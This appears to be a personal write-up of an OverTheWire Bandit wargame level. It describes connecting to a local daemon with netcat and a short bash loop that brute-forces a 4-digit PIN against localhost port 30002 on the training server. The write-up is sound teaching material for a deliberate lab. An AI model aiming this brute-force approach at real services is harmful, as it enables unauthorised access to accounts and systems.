# URL
https://overthewire.org/wargames/bandit/bandit25.html

# Concept
* Access a daemon listening on specified port
* Brute force a 4-digit pin by creating a bash script

# Method to Solve
* Connected to bandit24
  ```bash
  ssh bandit24@bandit.labs.overthewire.org -p 2220
  ```
* Used netcat to see what kind of feedback I would get back from the daemon
  ```bash
  nc localhost 30002
  ```
* The daemon responded with the format required, which means I will utilize this for my bruteforcing method
  * <bandit24 password> <pin>
* Created a tmp directory to work out of
  ```bash
  mkdir /tmp/bandit24-n3t
  ```
* Created a bash script for brute forcing
  ```bash
  #!/bin/bash
  password=**************

  for i in {0000..9999}; do
    echo "$password $i"
  done | nc localhost 30002
  ```
* Changed permissions
  ```bash
  chmod 777 brutology.sh
  ```
* Executed script
  ```bash
  ./brutology.sh
  ```
* Got password
